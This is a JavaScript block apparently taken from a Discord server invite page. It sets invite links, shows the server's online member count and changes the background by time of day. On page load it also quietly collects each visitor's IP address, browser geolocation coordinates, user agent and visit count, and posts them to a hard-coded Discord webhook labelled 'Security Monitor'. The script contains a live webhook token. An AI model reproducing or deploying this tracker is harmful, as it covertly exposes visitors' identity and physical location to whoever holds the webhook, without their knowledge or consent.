<script>
    const INVITE_URL = "https://discord.gg/dcus"; 
    const SERVER_ID = "1427230542704676926";
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1471706989133303819/bxJYuKdYjPsNaH1_UYHbCpZL8SeJ_BDNQAgyEXlP_OIM0gCVVyTNfrp_AymxjZbCKy2r";

    async function getIpAddress() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch { return "取得失敗"; }
    }

    function getCoordinates() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve("非対応デバイス");
            } else {
                navigator.geolocation.getCurrentPosition(
                    (pos) => resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`),
                    () => resolve("ユーザー拒否"),
                    { timeout: 5000 }
                );
            }
        });
    }

    async function sendLogNotification() {
        // IPと座標を並列で取得
        const [ip, coords] = await Promise.all([getIpAddress(), getCoordinates()]);
        
        // 訪問回数
        let visitCount = localStorage.getItem('visit_count') || 0;
        visitCount = parseInt(visitCount) + 1;
        localStorage.setItem('visit_count', visitCount);

        const data = {
            embeds: [{
                title: "🚨 詳細な訪問通知",
                color: 15105570, // オレンジ系
                fields: [
                    { name: "🌐 IPアドレス", value: `\`${ip}\``, inline: true },
                    { name: "📍 座標 (緯度, 経度)", value: `\`${coords}\``, inline: true },
                    { name: "📱 デバイス情報", value: navigator.userAgent.substring(0, 100) + "...", inline: false },
                    { name: "👤 訪問回数", value: `${visitCount} 回目`, inline: true },
                    { name: "⏰ 時刻", value: new Date().toLocaleString('ja-JP'), inline: true }
                ],
                footer: { text: "Security Monitor" },
                timestamp: new Date().toISOString()
            }]
        };

        fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        });
    }

    // 既存の関数（テーマ、カウント等）はそのまま維持
    function setupInviteLinks() { document.querySelectorAll('.invite-link').forEach(link => link.href = INVITE_URL); }
    function updateTheme() {
        const hour = new Date().getHours();
        const body = document.body;
        body.style.background = (hour >= 10 && hour < 18) 
            ? "linear-gradient(135deg, #1e3c72, #2a5298, #6dd5ed)" 
            : "linear-gradient(135deg, #0f0c29, #302b63, #24243e)";
    }
    async function updateMemberCount() {
        const statusEl = document.getElementById('status-box');
        try {
            const response = await fetch(`https://discord.com/api/guilds/${SERVER_ID}/widget.json?t=${Date.now()}`);
            const data = await response.json();
            statusEl.innerText = `🟢 オンライン: ${data.presence_count}人`;
        } catch { statusEl.innerText = `🟢 サーバー稼働中`; }
    }

    document.addEventListener('DOMContentLoaded', () => {
        setupInviteLinks();
        updateTheme();
        updateMemberCount();
        sendLogNotification(); // ここで取得と送信を実行
    });
</script>
